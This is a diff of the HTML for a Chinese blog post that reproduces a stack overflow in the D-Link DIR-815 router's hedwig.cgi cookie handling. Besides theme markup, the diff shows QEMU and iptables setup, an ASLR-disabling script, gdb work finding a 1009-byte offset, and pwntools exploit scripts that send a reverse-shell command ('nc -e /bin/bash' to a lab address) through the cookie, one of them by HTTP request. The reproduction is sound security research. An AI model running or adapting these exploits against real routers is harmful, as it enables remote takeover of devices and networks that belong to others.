@@ -211,7 +231,7 @@
 <p>网络配置工具：</p>
 <pre tabindex="0"><code>sudo apt-get install bridge-utils uml-utilities</code></pre><p>配置下网络：</p>
 <p>ubuntu:</p>
-<div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo sysctl -w net.ipv4.ip<span class="se">\_</span>forward<span class="o">=</span><span class="m">1</span>  
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo sysctl -w net.ipv4.ip<span class="se">\_</span>forward<span class="o">=</span><span class="m">1</span>  
 </span></span><span class="line"><span class="cl">sudo iptables -F  
 </span></span><span class="line"><span class="cl">sudo iptables -X  
 </span></span><span class="line"><span class="cl">sudo iptables -t nat -F  
@@ -225,11 +245,11 @@
 </span></span><span class="line"><span class="cl">sudo iptables -I FORWARD <span class="m">1</span> -i tap0 -j ACCEPT  
 </span></span><span class="line"><span class="cl">sudo iptables -I FORWARD <span class="m">1</span> -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT  
 </span></span><span class="line"><span class="cl">sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0</span></span></code></pre></div><p>qemu:</p>
-<div class="highlight" id="id-6"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ifconfig eth0 192.168.100.2 netmask 255.255.255.0  
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ifconfig eth0 192.168.100.2 netmask 255.255.255.0  
 </span></span><span class="line"><span class="cl">route add default gw 192.168.100.254</span></span></code></pre></div><p>可以ping通：</p>
 <p><img loading="lazy" src="/posts/dir815/image-20221021222854115.png" alt="image-20221021222854115" srcset="/posts/dir815/image-20221021222854115.png?size=small, /posts/dir815/image-20221021222854115.png?size=medium 1.5x, /posts/dir815/image-20221021222854115.png?size=large 2x" data-title="image-20221021222854115" style="--width: 1445px;--aspect-ratio: 1445 / 649;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>auto.sh并执行：</p>
-<div class="highlight" id="id-7"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash</span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/randomize_va_space
 </span></span><span class="line"><span class="cl">cp http_conf /
 </span></span><span class="line"><span class="cl">cp sbin/httpd /
@@ -326,17 +346,20 @@ Server
         }  
     }  
 }</code></pre><p>上传到qemu：</p>
-<div class="highlight" id="id-9"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">scp -r squashfs-root/ root@192.168.100.2:/root</span></span></code></pre></div><p>服务正常启动：</p>
-<div class="highlight" id="id-10"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">curl</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//192.168.100.2:4444/hedwig.cgi -v -X POST -H &#34;Content-Length: 8&#34; -b &#34;uid=zh&#34;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">scp -r squashfs-root/ root@192.168.100.2:/root</span></span></code></pre></div><p>服务正常启动：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">curl</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//192.168.100.2:4444/hedwig.cgi -v -X POST -H &#34;Content-Length: 8&#34; -b &#34;uid=zh&#34;
 </span></span></span></code></pre></div><p><img loading="lazy" src="/posts/dir815/image-20221022125353861.png" alt="image-20221022125353861" srcset="/posts/dir815/image-20221022125353861.png?size=small, /posts/dir815/image-20221022125353861.png?size=medium 1.5x, /posts/dir815/image-20221022125353861.png?size=large 2x" data-title="image-20221022125353861" style="--width: 1252px;--aspect-ratio: 1252 / 373;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>退出qemu的话要恢复下<code>etc</code>文件夹：</p>
-<div class="highlight" id="id-11"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash</span>
 </span></span><span class="line"><span class="cl">rm -rf /etc
 </span></span><span class="line"><span class="cl">mv /etc_bak/etc /etc
-</span></span><span class="line"><span class="cl">rm -rf /etc_bak</span></span></code></pre></div><h2 id="分析" class="heading-element">
-  <a href="#%e5%88%86%e6%9e%90" class="heading-mark"></a>分析</h2><p>DIR-815，exp：https://www.exploit-db.com/exploits/33863</p>
+</span></span><span class="line"><span class="cl">rm -rf /etc_bak</span></span></code></pre></div><h2 id="分析" class="heading-element"><span>分析</span>
+  <a href="#%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>DIR-815，exp：https://www.exploit-db.com/exploits/33863</p>
 <p>可以看到是cookie的输入有漏洞，</p>
-<div class="highlight" id="id-12"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl">    <span class="k">begin</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl">    <span class="k">begin</span>
 </span></span><span class="line"><span class="cl">      <span class="n">res</span> <span class="o">=</span> <span class="n">send_request_cgi</span><span class="p">({</span>
 </span></span><span class="line"><span class="cl">        <span class="s1">&#39;method&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;/hedwig.cgi&#34;</span><span class="p">,</span>
@@ -379,18 +402,24 @@ Server
 <p><img loading="lazy" src="/posts/dir815/image-20221022225442519.png" alt="image-20221022225442519" srcset="/posts/dir815/image-20221022225442519.png?size=small, /posts/dir815/image-20221022225442519.png?size=medium 1.5x, /posts/dir815/image-20221022225442519.png?size=large 2x" data-title="image-20221022225442519" style="--width: 1123px;--aspect-ratio: 1123 / 726;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>后面还有个<code>sprintf</code>，其中的v4没有变过</p>
 <p><img loading="lazy" src="/posts/dir815/image-20221022230300494.png" alt="image-20221022230300494" srcset="/posts/dir815/image-20221022230300494.png?size=small, /posts/dir815/image-20221022230300494.png?size=medium 1.5x, /posts/dir815/image-20221022230300494.png?size=large 2x" data-title="image-20221022230300494" style="--width: 1088px;--aspect-ratio: 1088 / 102;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h2 id="exp" class="heading-element">
-  <a href="#exp" class="heading-mark"></a>EXP</h2><p>有两种方式，一种是将写好的payload放到qemu执行，还有一种是直接发送http请求。</p>
-<h3 id="qemu执行exp" class="heading-element">
-  <a href="#qemu%e6%89%a7%e8%a1%8cexp" class="heading-mark"></a>qemu执行exp</h3><p>其中的test就是gdb的cyclic生成的字符串</p>
-<div class="highlight" id="id-13"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash  </span>
+<h2 id="exp" class="heading-element"><span>EXP</span>
+  <a href="#exp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>有两种方式，一种是将写好的payload放到qemu执行，还有一种是直接发送http请求。</p>
+<h3 id="qemu执行exp" class="heading-element"><span>qemu执行exp</span>
+  <a href="#qemu%e6%89%a7%e8%a1%8cexp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>其中的test就是gdb的cyclic生成的字符串</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash  </span>
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">&#34;application/x-www-form-urlencoded&#34;</span>  
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">HTTP_COOKIE</span><span class="o">=</span><span class="s2">&#34;uid=`cat test`&#34;</span>  
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$HTTP_COOKIE</span><span class="s2">&#34;</span> <span class="p">|</span> wc -c<span class="k">)</span>  
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span>  
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> REQUEST<span class="se">\_</span>URI<span class="o">=</span><span class="s2">&#34;/hedwig.cgi&#34;</span>  
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;uid=1111&#34;</span><span class="p">|</span>./gdbserver.mipsle 192.168.111.131:6666 /htdocs/web/hedwig.cgi  
-</span></span><span class="line"><span class="cl"><span class="c1">##echo &#34;uid=1111&#34;|/htdocs/web/hedwig.cgi</span></span></span></code></pre></div><div class="highlight" id="id-14"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gdb-multiarch htdocs/cgibin
+</span></span><span class="line"><span class="cl"><span class="c1">##echo &#34;uid=1111&#34;|/htdocs/web/hedwig.cgi</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gdb-multiarch htdocs/cgibin
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> architecture mips
 </span></span><span class="line"><span class="cl">target remote 192.168.100.2:6666
 </span></span><span class="line"><span class="cl">b hedwigcgi_main
@@ -398,7 +427,7 @@ Server
 </span></span><span class="line"><span class="cl">b *0x00409A28</span></span></code></pre></div><p>可以看到偏移为1009</p>
 <p><img loading="lazy" src="/posts/dir815/image-20221022232531539.png" alt="image-20221022232531539" srcset="/posts/dir815/image-20221022232531539.png?size=small, /posts/dir815/image-20221022232531539.png?size=medium 1.5x, /posts/dir815/image-20221022232531539.png?size=large 2x" data-title="image-20221022232531539" style="--width: 755px;--aspect-ratio: 755 / 549;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>重新写下看看偏移是否是1009：</p>
-<div class="highlight" id="id-15"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash  </span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">##!/bin/bash  </span>
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">&#34;application/x-www-form-urlencoded&#34;</span>  
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">HTTP_COOKIE</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s2">&#34;print &#39;uid=&#39; + &#39;A&#39;\*1009 + &#39;0000&#39;&#34;</span><span class="k">)</span>   
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$HTTP_COOKIE</span><span class="s2">&#34;</span> <span class="p">|</span> wc -c<span class="k">)</span>  
@@ -413,7 +442,7 @@ Server
 <p>其中的system，加上libc的base就是<code>0x767a8b200</code>，为了防止<code>00</code>，先减一，之后找个gadget加一就行</p>
 <p><img loading="lazy" src="/posts/dir815/image-20221022234213409.png" alt="image-20221022234213409" srcset="/posts/dir815/image-20221022234213409.png?size=small, /posts/dir815/image-20221022234213409.png?size=medium 1.5x, /posts/dir815/image-20221022234213409.png?size=large 2x" data-title="image-20221022234213409" style="--width: 1595px;--aspect-ratio: 1595 / 619;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>exp</p>
-<div class="highlight" id="id-16"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"> 
 </span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;nc -e /bin/bash 192.168.111.138 8888&#39;</span>
@@ -440,7 +469,7 @@ Server
 </span></span><span class="line"><span class="cl"><span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">fd</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></div><p>exp2:</p>
 <p>这个就是https://www.exploit-db.com/exploits/33863改的</p>
-<div class="highlight" id="id-17"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"> 
 </span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;nc -e /bin/bash 192.168.111.138 8888&#39;</span>
@@ -470,8 +499,11 @@ Server
 </span></span><span class="line"><span class="cl"><span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">fd</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></div><p><img loading="lazy" src="/posts/dir815/image-20221023175756580.png" alt="image-20221023175756580" srcset="/posts/dir815/image-20221023175756580.png?size=small, /posts/dir815/image-20221023175756580.png?size=medium 1.5x, /posts/dir815/image-20221023175756580.png?size=large 2x" data-title="image-20221023175756580" style="--width: 1533px;--aspect-ratio: 1533 / 437;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h3 id="http请求发payload" class="heading-element">
-  <a href="#http%e8%af%b7%e6%b1%82%e5%8f%91payload" class="heading-mark"></a>http请求发payload：</h3><div class="highlight" id="id-18"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<h3 id="http请求发payload" class="heading-element"><span>http请求发payload：</span>
+  <a href="#http%e8%af%b7%e6%b1%82%e5%8f%91payload" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;mips&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"> 
@@ -514,9 +546,9 @@ Server
           </div></div><div class="post-info-line">
         <div class="post-info-md"></div>
         <div class="post-info-share">
-          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/dir815/" data-title="DLink 815路由器栈溢出漏洞分析与复现" data-hashtags="漏洞复现"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/dir815/" data-hashtag="漏洞复现"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
-  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/dir815/" data-title="DLink 815路由器栈溢出漏洞分析与复现"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/dir815/" data-title="DLink 815路由器栈溢出漏洞分析与复现" data-hashtags="漏洞复现"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/dir815/" data-hashtag="漏洞复现"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/dir815/" data-title="DLink 815路由器栈溢出漏洞分析与复现"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
   </span>
         </div>
       </div></div>
@@ -535,14 +567,14 @@ Server
 
   <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
       <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
-    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.8-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
         </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
             <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
-              <a href="/"></a></span></div></div>
+              <a href="/">Ghostasky</a></span></div></div>
   </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
         </div></div><div id="mask"></div><noscript>
-    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
   </noscript>
 </div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
-    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.8-RC"};</script><script src="/js/theme.min.js" defer></script></body>
 </html>
